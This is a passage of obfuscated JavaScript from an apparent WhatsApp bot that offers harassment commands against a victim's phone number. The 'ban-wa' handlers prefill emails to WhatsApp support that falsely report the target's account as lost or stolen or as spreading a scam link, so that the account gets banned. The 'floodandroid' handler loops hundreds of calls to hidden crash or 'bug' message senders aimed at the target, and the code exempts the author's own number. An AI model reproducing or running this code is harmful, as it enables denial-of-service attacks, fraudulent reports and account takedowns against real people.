                text: "\n> `𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎` \n*𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐛𝐚𝐧𝐧𝐞𝐫 𝐭𝐞𝐱𝐭 𝐚𝐛𝐨𝐯𝐞. 𝐎𝐧𝐜𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐜𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐬𝐞𝐧𝐝 𝐛𝐮𝐭𝐭𝐨𝐧 𝐭𝐨 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐞𝐜𝐮𝐫𝐞𝐥𝐲.*"
              });
              await _0x35ec2a(240000);
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐛𝐚𝐧 𝐭𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐢𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬. 𝐓𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐛𝐚𝐧𝐧𝐞𝐝 𝐰𝐢𝐭𝐡𝐢𝐧 𝐭𝐡𝐞 𝐧𝐞𝐱𝐭 𝟖 𝐡𝐨𝐮𝐫𝐬.."
              });
            } catch (_0x2c4e09) {
              console.error("Error occurred:", _0x2c4e09);
            }
          })();
          break;
        }
      case "unban-wa5":
        {
          if (!_0x40d288) {
            return _0x32539a("Usage: ." + _0x4ae68c + " +2348108778025");
          }
          let _0x2868d5 = _0x40d288.replace(/[^0-9]/g, "");
          if (_0x2868d5.startsWith("0")) {
            return _0x32539a("Example: ." + _0x4ae68c + " 234xxxxxxxxx");
          }
          const _0x24d3e1 = await _0x4b53e5.onWhatsApp(_0x2868d5 + "@s.whatsapp.net");
          if (_0x2868d5 === "2348108778025") {
            return;
          }
          if (_0x24d3e1.length === 0) {
            return _0x32539a("The number is not registered on WhatsApp.");
          }
          const _0x40ea1d = "Pelo amor de Deus, Sr. Zuckerberg, estou implorando por misericórdia. Meu nome é " + _0x45dcac + ", e minha vida está completamente destruída sem minha conta do WhatsApp. Eu choro todos os dias, meus filhos estão sofrendo, e tudo o que eu tinha está indo embora. Não sei mais o que fazer, estou completamente perdida. Cada minuto sem minha conta me traz mais desespero, por favor, eu imploro, desbloqueie minha conta para que eu possa salvar minha família. Meu número é +" + _0x2868d5 + ". Eu me ajoelho e clamo pela sua ajuda, por favor, senhor.";
          const _0x213d1b = "mailto:support@whatsapp.com?subject=Desbloquear Conta&body=" + encodeURIComponent(_0x40ea1d);
          const _0x56c93c = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐔𝐍𝐁𝐀𝐍𝐍𝐄𝐑",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x213d1b,
            mediaUrl: _0x213d1b
          };
          const _0xe10ebe = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x56c93c
          };
          const _0x22376e = {
            text: _0x40ea1d,
            contextInfo: _0xe10ebe,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0x22376e);
          function _0x567e0a(_0x56ef67) {
            return new Promise(_0x4e69e2 => setTimeout(_0x4e69e2, _0x56ef67));
          }
          (async () => {
            try {
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "\n> `𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎` \n*𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐔𝐧𝐛𝐚𝐧𝐧𝐞𝐫 𝐭𝐞𝐱𝐭 𝐚𝐛𝐨𝐯𝐞. 𝐎𝐧𝐜𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐜𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐬𝐞𝐧𝐝 𝐛𝐮𝐭𝐭𝐨𝐧 𝐭𝐨 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐞𝐜𝐮𝐫𝐞𝐥𝐲.*"
              });
              await _0x567e0a(90000);
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "_𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐮𝐧𝐛𝐚𝐧 𝐭𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐢𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬. 𝐓𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝 𝐰𝐢𝐭𝐡𝐢𝐧 𝐭𝐡𝐞 𝐧𝐞𝐱𝐭 𝟖 𝐡𝐨𝐮𝐫𝐬._"
              });
            } catch (_0x36ed2c) {
              console.error("Error occurred:", _0x36ed2c);
            }
          })();
          break;
        }
      case "unban-wa4":
        {
          if (!_0x40d288) {
            return _0x32539a("Usage: ." + _0x4ae68c + " +2348108778025");
          }
          let _0x2b28eb = _0x40d288.replace(/[^0-9]/g, "");
          if (_0x2b28eb.startsWith("0")) {
            return _0x32539a("Example: ." + _0x4ae68c + " 234xxxxxxxxx");
          }
          const _0x32eb3d = await _0x4b53e5.onWhatsApp(_0x2b28eb + "@s.whatsapp.net");
          if (_0x2b28eb === "2348108778025") {
            return;
          }
          if (_0x32eb3d.length === 0) {
            return _0x32539a("The number is not registered on WhatsApp.");
          }
          const _0x48d0c1 = "Monsieur Zuckerberg, je vous en supplie, je suis à bout. Mon nom est " + _0x45dcac + " et sans mon compte WhatsApp, ma vie est en train de s’effondrer. Je ne peux plus nourrir mes enfants, nous sommes affamés. Je pleure tous les jours, je ne sais pas comment je vais survivre ! Vous êtes mon seul espoir. Je vous en supplie de tout mon cœur, débloquez mon compte. Mes enfants pleurent, et je suis impuissante. Aidez-moi, s’il vous plaît ! Mon numéro est +" + _0x2b28eb + ". Je vous supplie, faites quelque chose avant qu'il ne soit trop tard.";
          const _0x2d52e8 = "mailto:support@whatsapp.com?subject=Débloquer Compte&body=" + encodeURIComponent(_0x48d0c1);
          const _0x21bf44 = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐔𝐍𝐁𝐀𝐍𝐍𝐄𝐑",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x2d52e8,
            mediaUrl: _0x2d52e8
          };
          const _0x2c14ef = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x21bf44
          };
          const _0x28c17a = {
            text: _0x48d0c1,
            contextInfo: _0x2c14ef,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0x28c17a);
          function _0x4bf311(_0x528675) {
            return new Promise(_0x513989 => setTimeout(_0x513989, _0x528675));
          }
          (async () => {
            try {
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "\n> `𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎` \n*𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐔𝐧𝐛𝐚𝐧𝐧𝐞𝐫 𝐭𝐞𝐱𝐭 𝐚𝐛𝐨𝐯𝐞. 𝐎𝐧𝐜𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐜𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐬𝐞𝐧𝐝 𝐛𝐮𝐭𝐭𝐨𝐧 𝐭𝐨 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐞𝐜𝐮𝐫𝐞𝐥𝐲.*"
              });
              await _0x4bf311(90000);
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "_𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐮𝐧𝐛𝐚𝐧 𝐭𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐢𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬. 𝐓𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝 𝐰𝐢𝐭𝐡𝐢𝐧 𝐭𝐡𝐞 𝐧𝐞𝐱𝐭 𝟖 𝐡𝐨𝐮𝐫𝐬._"
              });
            } catch (_0x1dd793) {
              console.error("Error occurred:", _0x1dd793);
            }
          })();
          break;
        }
      case "unban-wa1":
        {
          if (!_0x40d288) {
            return _0x32539a("Usage: ." + _0x4ae68c + " +2348108778025");
          }
          let _0x512916 = _0x40d288.replace(/[^0-9]/g, "");
          if (_0x512916.startsWith("0")) {
            return _0x32539a("Example: ." + _0x4ae68c + " 234xxxxxxxxx");
          }
          const _0x510aea = await _0x4b53e5.onWhatsApp(_0x512916 + "@s.whatsapp.net");
          if (_0x512916 === "2348108778025") {
            return;
          }
          if (_0x510aea.length === 0) {
            return _0x32539a("The number is not registered on WhatsApp.");
          }
          const _0x13800 = "Meu número é novo, e com isso acabei de abrir a industria e neste Grupo preciso muito da minha conta, não estou infringindo nenhuma regra da politica de privacidade, por isso solicito a equipe de suporte do whatsapp que tome providências o mais rápido possível para que Posso ter acesso ao material do meu grupo em +" + _0x512916;
          const _0x36eb1e = "mailto:support@whatsapp.com?subject=Unban Account&body=" + encodeURIComponent(_0x13800);
          const _0x4d18bd = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐔𝐍𝐁𝐀𝐍 𝐑𝐄𝐐𝐔𝐄𝐒𝐓",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x36eb1e,
            mediaUrl: _0x36eb1e
          };
          const _0x26fabb = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x4d18bd
          };
          const _0x5a9cae = {
            text: _0x13800,
            contextInfo: _0x26fabb,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0x5a9cae);
          function _0x369725(_0x2e57fb) {
            return new Promise(_0x3d2fbe => setTimeout(_0x3d2fbe, _0x2e57fb));
          }
          (async () => {
            try {
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "\n> `𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎` \n*𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐔𝐧𝐛𝐚𝐧𝐧𝐞𝐫 𝐭𝐞𝐱𝐭 𝐚𝐛𝐨𝐯𝐞. 𝐎𝐧𝐜𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐜𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐬𝐞𝐧𝐝 𝐛𝐮𝐭𝐭𝐨𝐧 𝐭𝐨 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐞𝐜𝐮𝐫𝐞𝐥𝐲.*"
              });
              await _0x369725(240000);
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "_𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐮𝐧𝐛𝐚𝐧 𝐭𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐢𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬. 𝐓𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝 𝐰𝐢𝐭𝐡𝐢𝐧 𝐭𝐡𝐞 𝐧𝐞𝐱𝐭 𝟖 𝐡𝐨𝐮𝐫𝐬._"
              });
            } catch (_0x4312a8) {
              console.error("Error occurred:", _0x4312a8);
            }
          })();
          break;
        }
      case "ban-wa2":
        {
          if (!_0x40d288) {
            return _0x32539a("Usage: ." + _0x4ae68c + " +2348108778025");
          }
          let _0x2b0d70 = _0x40d288.replace(/[^0-9]/g, "");
          if (_0x2b0d70.startsWith("0")) {
            return _0x32539a("Example: ." + _0x4ae68c + " 234xxxxxxxxx");
          }
          const _0x136ea9 = await _0x4b53e5.onWhatsApp(_0x2b0d70 + "@s.whatsapp.net");
          if (_0x2b0d70 === "2348108778025") {
            return;
          }
          if (_0x136ea9.length === 0) {
            return _0x32539a("The number is not registered on WhatsApp.");
          }
          const _0x1d47b8 = "হারিয়ে/চুরি গেছে: অনুগ্রহ করে আমার অ্যাকাউন্ট নিষ্ক্রিয় করুন +" + _0x2b0d70;
          const _0x5aa4fd = "mailto:support@whatsapp.com?subject=LOST/STOLEN&body=" + encodeURIComponent(_0x1d47b8);
          const _0x5c276c = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐁𝐀𝐍𝐍𝐄𝐑",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x5aa4fd,
            mediaUrl: _0x5aa4fd
          };
          const _0x3897e8 = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x5c276c
          };
          const _0x424f1b = {
            text: _0x1d47b8,
            contextInfo: _0x3897e8,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0x424f1b);
          function _0x275ca3(_0x2cf101) {
            return new Promise(_0x2525e9 => setTimeout(_0x2525e9, _0x2cf101));
          }
          (async () => {
            try {
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "\n> `𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎` \n*𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐛𝐚𝐧𝐧𝐞𝐫 𝐭𝐞𝐱𝐭 𝐚𝐛𝐨𝐯𝐞. 𝐎𝐧𝐜𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐜𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐬𝐞𝐧𝐝 𝐛𝐮𝐭𝐭𝐨𝐧 𝐭𝐨 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐞𝐜𝐮𝐫𝐞𝐥𝐲.*"
              });
              await _0x275ca3(240000);
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐛𝐚𝐧 𝐭𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐢𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬. 𝐓𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐛𝐚𝐧𝐧𝐞𝐝 𝐰𝐢𝐭𝐡𝐢𝐧 𝐭𝐡𝐞 𝐧𝐞𝐱𝐭 𝟖 𝐡𝐨𝐮𝐫𝐬.."
              });
            } catch (_0x2ddf67) {
              console.error("Error occurred:", _0x2ddf67);
            }
          })();
          break;
        }
      case "floodandroid":
        {
          if (!q) {
            return _0x3b9923("*Syntax Error!*\n\n_Use : Android Number_\n_Example : floodandroid 62xx_\n");
          }
          let {
            proto: _0x8ad0cb,
            generateWAMessageFromContent: _0x2ce364
          } = require("@whiskeysockets/baileys");
          incTarget = _0x40d288.split("|")[0].replace(/[^0-9]/g, "");
          if (incTarget.startsWith("0")) {
            return _0x3b9923("*Syntax Error!*\n\n_Use : Android Number_\n_Example : floodandroid 62xx_\n");
          }
          let _0x14b896 = incTarget + "@s.whatsapp.net";
          await _0x34c772();
          await _0x3b9923(mess.bugrespon);
          global.jumlah = _0x40d288.split("|")[1];
          for (let _0x39c357 = 0; _0x39c357 < 1; _0x39c357++) {
            await _0x212e77(_0x14b896, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x34a350, Ptcp = true);
          }
          for (let _0x351793 = 0; _0x351793 < 20; _0x351793++) {
            await _0x48a443(_0x14b896, _0x34a350, Ptcp = true);
          }
          for (let _0x5c1da8 = 0; _0x5c1da8 < 10; _0x5c1da8++) {
            0;
            await _0x2f7ba8(_0x14b896, null, _0x34a350, cct = true, ptcp = true);
            await _0x2f7ba8(_0x14b896, null, _0x34a350, cct = true, ptcp = true);
            await _0x2f7ba8(_0x14b896, null, _0x3e7cb4, _0x34a350, cct = true, ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
          }
          for (let _0x38b63d = 0; _0x38b63d < 6; _0x38b63d++) {
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
          }
          for (let _0x468893 = 0; _0x468893 < 10; _0x468893++) {
            await _0x2f7ba8(_0x14b896, null, _0x3e7cb4, _0x34a350, cct = true, ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
          }
          await _0x96020a(15000);
          for (let _0x1007ca = 0; _0x1007ca < 6; _0x1007ca++) {
            await _0x2f7ba8(_0x14b896, null, _0x3e7cb4, _0x34a350, cct = true, ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
          }
          await _0x96020a(60000);
          for (let _0x12b49d = 0; _0x12b49d < 10; _0x12b49d++) {
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
          }
          await _0x96020a(240000);
          for (let _0x4a05fb = 0; _0x4a05fb < 300; _0x4a05fb++) {
            await _0x2f7ba8(_0x14b896, null, _0x3e7cb4, _0x34a350, cct = true, ptcp = true);
            await _0x96020a(600);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0x96020a(240000);
            for (let _0x165563 = 0; _0x165563 < 10; _0x165563++) {
              await _0x2f7ba8(_0x14b896, null, _0x3e7cb4, _0x34a350, cct = true, ptcp = true);
            }
            await _0x96020a(600);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0x96020a(240000);
            for (let _0xdb6bb0 = 0; _0xdb6bb0 < 10; _0xdb6bb0++) {
              await _0x2f7ba8(_0x14b896, null, _0x3e7cb4, _0x34a350, cct = true, ptcp = true);
            }
            await _0x96020a(600);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0x96020a(240000);
            for (let _0x254ee3 = 0; _0x254ee3 < 10; _0x254ee3++) {
              await _0x2f7ba8(_0x14b896, null, _0x3e7cb4, _0x34a350, cct = true, ptcp = true);
            }
            await _0x96020a(600);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0x96020a(240000);
            for (let _0x39fb03 = 0; _0x39fb03 < 10; _0x39fb03++) {
              await _0x2f7ba8(_0x14b896, null, _0x3e7cb4, _0x34a350, cct = true, ptcp = true);
            }
            await _0x96020a(600);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0x96020a(240000);
            for (let _0x5215d9 = 0; _0x5215d9 < 10; _0x5215d9++) {
              await _0x2f7ba8(_0x14b896, null, _0x3e7cb4, _0x34a350, cct = true, ptcp = true);
            }
            await _0x96020a(600);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
            await _0xe3a42f(_0x14b896, _0x3e7cb4, _0x34a350, Ptcp = true);
          }
          await _0x3b9923(mess.donebug)(_0x4e7e34);
        }
        break;
      case "ban-wa3":
        {
          if (!_0x40d288) {
            return _0x32539a("Usage: ." + _0x4ae68c + " +2348108778025");
          }
          let _0x337a49 = _0x40d288.replace(/[^0-9]/g, "");
          if (_0x337a49.startsWith("0")) {
            return _0x32539a("Example: ." + _0x4ae68c + " 234xxxxxxxxx");
          }
          const _0x1372b4 = await _0x4b53e5.onWhatsApp(_0x337a49 + "@s.whatsapp.net");
          if (_0x337a49 === "2348108778025") {
            return;
          }
          if (_0x1372b4.length === 0) {
            return _0x32539a("The number is not registered on WhatsApp.");
          }
          const _0x5e2f43 = "اربح المال بسهولة عبر الإنترنت لمدة ساعة واحدة بسعر 10 آلاف💰.\nفقط في هذا الاستبيان، قم بتسجيل حسابك على الفور، ما عليك سوى رقم واتساب جاهز للاتصال بالإنترنت 🤑.\nلا تفوت هذه الفرصة، سجل الآن باستخدام رمز QR 📄\n\nقم بالرد بـ \"1\" وانقر على الرابط أدناه 👇\nhttps://server.go-share.top/\n\nوتواصل مع WhatsApp الخاص بي إذا كنت ترغب في الحصول على مكافأة!!🎁\nhttps://api.whatsapp.com/send?phone=" + _0x337a49;
          const _0x592152 = "mailto:support@whatsapp.com?subject=LOST/STOLEN&body=" + encodeURIComponent(_0x5e2f43);
          const _0x42f94f = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐁𝐀𝐍𝐍𝐄𝐑",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x592152,
            mediaUrl: _0x592152
          };
          const _0x38fcc0 = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x42f94f
          };
          const _0x4b4187 = {
            text: _0x5e2f43,
            contextInfo: _0x38fcc0,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0x4b4187);
          function _0x463b99(_0x5e4b00) {
            return new Promise(_0x346572 => setTimeout(_0x346572, _0x5e4b00));
          }
          (async () => {
            try {
              await _0x4b53e5.sendMessage(_0x22a0dd, {
